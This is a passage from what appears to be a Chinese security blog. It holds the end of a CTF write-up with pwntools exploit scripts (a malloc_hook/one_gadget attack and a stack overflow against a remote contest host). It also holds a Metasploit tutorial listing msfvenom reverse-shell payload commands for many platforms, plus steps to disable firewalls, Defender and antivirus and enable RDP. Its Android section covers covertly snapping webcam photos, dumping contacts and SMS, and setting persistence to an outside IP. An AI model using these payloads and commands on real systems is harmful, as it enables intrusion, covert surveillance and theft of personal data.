p8(<span class="built_in">int</span>(ru(<span class="string">&#x27; &#x27;</span>), <span class="number">16</span>))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">		key_3 += p8(<span class="built_in">int</span>(ru(<span class="string">&#x27; &#x27;</span>), <span class="number">16</span>))</span><br><span class="line">	md(<span class="number">2</span>, lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>], <span class="number">0x8</span>, p64(lib.sym[<span class="string">&#x27;realloc&#x27;</span>]), key_3) <span class="comment"># 2</span></span><br><span class="line">	md(<span class="number">2</span>, lib.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>], <span class="number">0x8</span>, p64(one_gadget), key_3) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;5.Exit&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x108</span>))</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400990</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// w0</span></span><br><span class="line">  __int64 v1; <span class="comment">// x0</span></span><br><span class="line">  __int64 v2; <span class="comment">// x0</span></span><br><span class="line">  __int64 v3; <span class="comment">// x0</span></span><br><span class="line">  __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  __int64 v6; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [xsp+78h] [xbp+78h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [xsp+DCh] [xbp+DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [xsp+E0h] [xbp+E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [xsp+E4h] [xbp+E4h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [xsp+E8h] [xbp+E8h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [xsp+ECh] [xbp+ECh]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [xsp+F0h] [xbp+F0h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [xsp+F4h] [xbp+F4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [xsp+F8h] [xbp+F8h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [xsp+FCh] [xbp+FCh]</span></span><br><span class="line"></span><br><span class="line">  sub_400940();</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = time(<span class="number">0L</span>L);</span><br><span class="line">    v15 = v0;</span><br><span class="line">    srand(v0);</span><br><span class="line">    v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)rand(v1) % <span class="number">100</span>);</span><br><span class="line">    v14 = v2;</span><br><span class="line">    v3 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)rand(v2) % <span class="number">100</span>);</span><br><span class="line">    v13 = v3;</span><br><span class="line">    v4 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)rand(v3) % <span class="number">100</span>);</span><br><span class="line">    v12 = v4;</span><br><span class="line">    v11 = (<span class="keyword">signed</span> <span class="keyword">int</span>)rand(v4) % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;there have 200 levels ~&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Math: %d * %d + %d + %d = ???&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input answer:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v6, <span class="number">0x14</span>uLL);</span><br><span class="line">    v10 = v14 * v13 + v12 + v11;</span><br><span class="line">    v9 = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v6, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 != v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;good !&quot;</span>);</span><br><span class="line">    ++v16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v16 &lt;= <span class="number">199</span> );</span><br><span class="line">  v8 = <span class="number">256</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;v7, <span class="number">0x6E</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v8 == <span class="number">0x12235612</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get it ~&quot;</span>);</span><br><span class="line">    sub_400920();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面的运算就行, 然后通过溢出修改v8值即可</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;39.97.210.182&quot;</span></span><br><span class="line">remotePort = <span class="number">40285</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">		ru(<span class="string">&#x27;Math:&#x27;</span>)</span><br><span class="line">		num_1 = <span class="built_in">int</span>(ru(<span class="string">&#x27;*&#x27;</span>), <span class="number">10</span>)</span><br><span class="line">		num_2 = <span class="built_in">int</span>(ru(<span class="string">&#x27;+&#x27;</span>), <span class="number">10</span>)</span><br><span class="line">		num_3 = <span class="built_in">int</span>(ru(<span class="string">&#x27;+&#x27;</span>), <span class="number">10</span>)</span><br><span class="line">		num_4 = <span class="built_in">int</span>(ru(<span class="string">&#x27;=&#x27;</span>), <span class="number">10</span>)</span><br><span class="line">		li(<span class="string">&#x27;nums: &#x27;</span> + <span class="built_in">str</span>(num_1) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(num_2))</span><br><span class="line">		li(<span class="string">&#x27;nums: &#x27;</span> + <span class="built_in">str</span>(num_3) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(num_4))</span><br><span class="line">		result = num_1 * num_2 + num_3 + num_4</span><br><span class="line">		sl(<span class="built_in">str</span>(result))</span><br><span class="line">	li(<span class="string">&#x27;end!&#x27;</span>)</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0xDC</span> - <span class="number">0x78</span>)</span><br><span class="line">	p += p32(<span class="number">0x12235612</span>)</span><br><span class="line">	s(p)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/06/18/wp-hfb-2020/" data-id="ckhemv82q0030wdcm5xppe50f" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-metasploit" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/31/metasploit/" class="article-date">
  <time datetime="2020-05-31T03:36:30.000Z" itemprop="datePublished">2020-05-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/31/metasploit/">Metasploit</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h1><p>Metasploit  Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具</p>
<h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>msfvenom a Metasploit standalone payload generator，Also a replacement for msfpayload and msfencode.是用来生成后门的软件</p>
<p>查看所有–payload的模块</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure>

<p>文件后缀名-f的格式</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --help-formats</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line"></span><br><span class="line">　　msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line"></span><br><span class="line">　　msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">Mac</span><br><span class="line"></span><br><span class="line">　　msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb Payloads</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line"></span><br><span class="line">　　msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP</span><br><span class="line"></span><br><span class="line">　　msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line"></span><br><span class="line">　　msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">WAR</span><br><span class="line"></span><br><span class="line">　　msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br><span class="line">Scripting Payloads</span><br><span class="line"></span><br><span class="line">Python</span><br><span class="line">　　msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash</span><br><span class="line"></span><br><span class="line">　　msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl</span><br><span class="line"></span><br><span class="line">　　msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h3><p>输入命令：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<h3 id="metasploit侦听"><a href="#metasploit侦听" class="headerlink" title="metasploit侦听"></a><strong>metasploit侦听</strong></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler     <span class="comment">#加载模块</span></span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp    <span class="comment">#设置payload</span></span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost kali的ip   <span class="comment">#设置kali的ip</span></span><br><span class="line">lhost =&gt; 192.168.152.131</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 1211   <span class="comment">#设置kali的端口</span></span><br><span class="line">lport =&gt; 1211</span><br><span class="line">msf exploit(multi/handler) &gt; exploit   <span class="comment">#执行</span></span><br><span class="line">[*] Started reverse TCP handler on 222.222.221.140:1211</span><br></pre></td></tr></table></figure>



<h3 id="将生成的shell上传至windows主机中并运行"><a href="#将生成的shell上传至windows主机中并运行" class="headerlink" title="将生成的shell上传至windows主机中并运行"></a><strong>将生成的shell上传至windows主机中并运行</strong></h3><p>提示有返回即可控制对方电脑，如同操作linux服务器一样</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>？ - 帮助菜单</p>
<p>download -下载文件/文件夹</p>
<h2 id="msfvenom的apk在android中的使用"><a href="#msfvenom的apk在android中的使用" class="headerlink" title="msfvenom的apk在android中的使用"></a>msfvenom的apk在android中的使用</h2><h3 id="msfvenom生成shell-apk"><a href="#msfvenom生成shell-apk" class="headerlink" title="msfvenom生成shell.apk"></a><strong>msfvenom生成shell.apk</strong></h3><p>ifconfig查看kali的ip，ip为222.222.221.140</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=你kali的ip LPORT=5555 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure>

<h3 id="metasploit配置及监听"><a href="#metasploit配置及监听" class="headerlink" title="metasploit配置及监听"></a>metasploit配置及监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在控制台中输入</span><br><span class="line"></span><br><span class="line">    use exploit&#x2F;multi&#x2F;handler   &#x2F;&#x2F;加载模块</span><br><span class="line">    set payload android&#x2F;meterpreter&#x2F;reverse_tcp   &#x2F;&#x2F;选择Payload</span><br><span class="line">    show options   &#x2F;&#x2F;查看参数设置</span><br><span class="line"></span><br><span class="line">    set LHOST 192.168.1.114   &#x2F;&#x2F;这里的地址设置成我们刚才生成木马的IP地址（kali的ip）</span><br><span class="line"></span><br><span class="line">    set LPORT 5555   &#x2F;&#x2F;这里的端口设置成刚才我们生成木马所监听的端口</span><br><span class="line"></span><br><span class="line">    exploit   &#x2F;&#x2F;开始执行漏洞 开始监听,等待手机上线</span><br><span class="line">    -j 参数后台监听</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="msf远程桌面控制"><a href="#msf远程桌面控制" class="headerlink" title="msf远程桌面控制"></a>msf远程桌面控制</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>netsh advfirewall set allprofiles state off</p>
<h3 id="关闭denfender"><a href="#关闭denfender" class="headerlink" title="关闭denfender"></a>关闭denfender</h3><p>输入shell 进入 cmdshell里面</p>
<p>net stop windefend</p>
<p>run killav //关闭杀毒软件</p>
<p>启动远程桌面</p>
<p>run post/windows/manage/enable_rdp</p>
<p>run getgui -e</p>
<p>run getgui -u 123 -p 123</p>
<p>run getgui -e -f 8888</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="vnc远程连接"><a href="#vnc远程连接" class="headerlink" title="vnc远程连接"></a>vnc远程连接</h4><p>run vnc</p>
<h4 id="如何控制"><a href="#如何控制" class="headerlink" title="如何控制"></a>如何控制</h4><p>由于使用已经封装好的vnc只能进行靶机桌面的监控，并不能完成对靶机桌面的控制，因此想要完成对靶机的控制，需要对vnc.rb文件进行修改。<br> 在目录<code>/usr/share/metasploit-framework/scripts/meterpreter/</code>下找到<code>vnc.rb</code>文件</p>
<p> 在该文件中找到<code>pay</code>的声明位置，在其后添加<code>pay.datastore[&#39;ViewOnly&#39;] = false</code>后即可对远程桌面进行控制。</p>
<h3 id="一些关于远程桌面的命令"><a href="#一些关于远程桌面的命令" class="headerlink" title="一些关于远程桌面的命令"></a>一些关于远程桌面的命令</h3><blockquote>
<p>enumdesktops   #查看可用的桌面<br>getdesktop   #获取当前 meterpreter 关联的桌面<br>set_desktop   #设置 meterpreter 关联的桌面 h 查看帮助<br>screenshot   #截屏<br>use espia   #或者使用 espia 模块截屏 然后输入 screengrab</p>
</blockquote>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查看手机信息</span><br><span class="line">sysinfo</span><br><span class="line"># 查看手机有多少个摄像头 这里显示是2个</span><br><span class="line">webcam_list </span><br><span class="line"># 开启摄像头</span><br><span class="line">webcam_stream </span><br><span class="line"># 隐秘拍照功能</span><br><span class="line">webcam_snap </span><br><span class="line"># 导出电话号码</span><br><span class="line">dump_contacts </span><br><span class="line"># 导出信息</span><br><span class="line">dump_sms</span><br><span class="line"># 导出的文件拍的照片都会在root下面</span><br><span class="line"># 留后门</span><br><span class="line">run persistence -X -i 5 -p 10000 -r  39.97.119.22</span><br><span class="line"># 持续监听</span><br><span class="line">set ExitOnSession false</span><br></pre></td></tr></table></figure>

<p>可以输入?查看更多命令</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/05/31/metasploit/" data-id="ckhemv80s0016wdcm0iegfskm" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li></ul>

    </footer>
  </div>
  
</article>


  
